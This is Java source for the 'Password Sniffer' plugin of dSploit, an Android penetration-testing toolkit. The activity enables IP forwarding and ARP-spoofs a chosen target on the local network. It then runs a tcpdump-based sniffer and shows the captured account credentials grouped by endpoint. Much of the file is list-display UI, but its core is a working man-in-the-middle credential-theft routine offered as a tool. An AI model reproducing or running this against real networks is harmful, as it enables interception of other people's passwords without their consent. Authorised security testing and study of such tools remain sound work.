/*
 * This file is part of the dSploit.
 *
 * Copyleft of Simone Margaritelli aka evilsocket <evilsocket@gmail.com>
 *
 * dSploit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * dSploit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with dSploit.  If not, see <http://www.gnu.org/licenses/>.
 */
package it.evilsocket.dsploit.plugins.mitm;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Set;

import it.evilsocket.dsploit.R;
import it.evilsocket.dsploit.net.Stream;
import it.evilsocket.dsploit.system.Environment;
import it.evilsocket.dsploit.system.Shell.OutputReceiver;
import it.evilsocket.dsploit.tools.ArpSpoof;
import it.evilsocket.dsploit.tools.TcpDump;
import it.evilsocket.dsploit.tools.TcpDump.PasswordReceiver;
import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.Activity;
import android.content.Context;
import android.graphics.Typeface;
import android.os.Bundle;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.ViewGroup;
import android.widget.BaseExpandableListAdapter;
import android.widget.ExpandableListView;
import android.widget.ExpandableListView.OnChildClickListener;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;
import android.widget.ToggleButton;

public class PasswordSniffer extends Activity 
{
	private static final String  PCAP_FILTER = "not '(src host localhost or dst host localhost or arp)'";

	private ToggleButton       mSniffToggleButton = null;
	private ProgressBar	       mSniffProgress     = null;
	private ExpandableListView mListView		  = null;		
	private ListViewAdapter	   mAdapter			  = null;
	private boolean	           mRunning			  = false;	
	private ArpSpoof           mArpSpoof		  = null;
	private TcpDump	           mTcpDump			  = null;
	
	public class ListViewAdapter extends BaseExpandableListAdapter
	{
		private HashMap< String, ArrayList<String> > mGroups   = null;
		private Context								 mContext  = null;

		public ListViewAdapter( Context context ) {
			mGroups  = new HashMap< String, ArrayList<String> >();
			mContext = context; 
		}
		
		public boolean hasGroup( String name ) {
			return mGroups.containsKey(name);
		}
		
		public void addGroup( String name ) {
			mGroups.put( name, new ArrayList<String>() );
			notifyDataSetChanged();
		}
		
		public void addChild( String group, String child ) {
			if( !hasGroup( group ) )
				addGroup( group );
			
			mGroups.get( group ).add( child );
			
			Object[] keys   = mGroups.keySet().toArray();
			int 	 groups = keys.length;

			for( int i = 0; i < groups; i++ )
			{
				if( keys[i].toString().equals(group) )
				{
					mListView.expandGroup( i );
					break;
				}
			}
			
			notifyDataSetChanged();
		}
		
		private ArrayList<String> getGroupAt( int position ){
			return mGroups.get( mGroups.keySet().toArray()[ position ] );
		}
		
		@Override
		public Object getChild( int groupPosition, int childPosition ) {
			return getGroupAt( groupPosition ).get( childPosition );
		}

		@Override
		public long getChildId( int groupPosition, int childPosition ) {			
			return ( groupPosition * 10 ) + childPosition;
		}

		@Override
		public int getChildrenCount( int groupPosition ) {
			return getGroupAt( groupPosition ).size();
		}

		@Override
		public Object getGroup( int groupPosition ) {
			return mGroups.keySet().toArray()[ groupPosition ];
		}

		@Override
		public int getGroupCount() {
			return mGroups.size();
		}

		@Override
		public long getGroupId(int groupPosition) {
			return groupPosition;
		}

		@Override
		public View getGroupView( int groupPosition, boolean isExpanded, View convertView, ViewGroup parent ) {
			TextView row = (TextView)convertView;
		    if( row == null ) 		    
		      row = new TextView( mContext);
		    
		    row.setText( getGroup( groupPosition ).toString() );
		    row.setTextSize( 20 );
		    row.setTypeface( Typeface.DEFAULT_BOLD );
		    row.setPadding( 50, 0, 0, 0 );
		    
		    return row;
		}
		
		@Override
		public View getChildView( int groupPosition, int childPosition, boolean isLastChild, View convertView, ViewGroup parent ) {
			TextView row = (TextView)convertView;
		    if( row == null ) 		    
		      row = new TextView( mContext);
		    
		    row.setText( getChild( groupPosition, childPosition ).toString() );
		    row.setPadding( 30, 0, 0, 0 );
		    
		    return row;
		}

		@Override
		public boolean hasStableIds() {
			return true;
		}

		@Override
		public boolean isChildSelectable(int groupPosition, int childPosition) {
			return true;
		}
		
	}
	
	public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);        
        setTitle( "MITM - Password Sniffer" );
        setContentView( R.layout.plugin_mitm_password_sniffer );
        
        mSniffToggleButton = ( ToggleButton )findViewById( R.id.sniffToggleButton );
        mSniffProgress	   = ( ProgressBar )findViewById( R.id.sniffActivity );
        mListView		   = ( ExpandableListView )findViewById( R.id.listView );
        mAdapter		   = new ListViewAdapter( this );
        
        mListView.setAdapter( mAdapter );

        mArpSpoof = new ArpSpoof( this );
        mTcpDump  = new TcpDump( this );
                
        mSniffToggleButton.setOnClickListener( new OnClickListener(){
			@Override
			public void onClick(View v) {
				if( mRunning )
				{
					setStoppedState();
				}
				else
				{
					setStartedState();
				}
			}} 
		);        
	}

	private void setStoppedState( ) {		
		mArpSpoof.kill();
		mTcpDump.kill();

		Environment.setForwarding( false );
		
		mSniffProgress.setVisibility( View.INVISIBLE );
		
		mRunning = false;
		mSniffToggleButton.setChecked( false );                			
	}

	private void setStartedState( ) {		
		// never say never :)
		mArpSpoof.kill();
		mTcpDump.kill();
		
		final ArpSpoof spoof = mArpSpoof;
		final TcpDump  dump  = mTcpDump;
		
		Environment.setForwarding( true );
		
		OutputReceiver receiver = new OutputReceiver(){
			@Override
			public void onStart(String command) {
				Log.d( "ARPSPOOF", "ArpSpoof started." );
			}

			@Override
			public void onNewLine( String line ) {
				// arpspoof sometimes goes segfault, restart it just in case :P
				if( line.trim().toLowerCase().contains("segmentation fault") )
				{
					Log.w( "ARPSPOOF", "Restarting arpspoof after SEGFAULT" );
					spoof.kill();
					spoof.spoof( Environment.getTarget(), this ).start();
				}
			}

			@Override
			public void onEnd(int exitCode) { 
				Log.w( "ARPSPOOF", "Ended with code " + exitCode );
			}
		};
			
		spoof.spoof( Environment.getTarget(), receiver ).start();
		
		dump.sniffPasswords( PCAP_FILTER, new PasswordReceiver(){
			@Override
			public void onAccountFound( final Stream stream, final String data ) {
				
				PasswordSniffer.this.runOnUiThread( new Runnable() {
					@Override
					public void run()
					{												
						mAdapter.addChild( stream.endpoint.toString(), data );
					}							
				});				
			}
			
		}).start();
		
		mSniffProgress.setVisibility( View.VISIBLE );
		mRunning = true;
	}
	
	@Override
	public void onBackPressed() {
	    setStoppedState();	
	    super.onBackPressed();
	    overridePendingTransition(R.anim.slide_in_left, R.anim.slide_out_left);	    	    
	}
}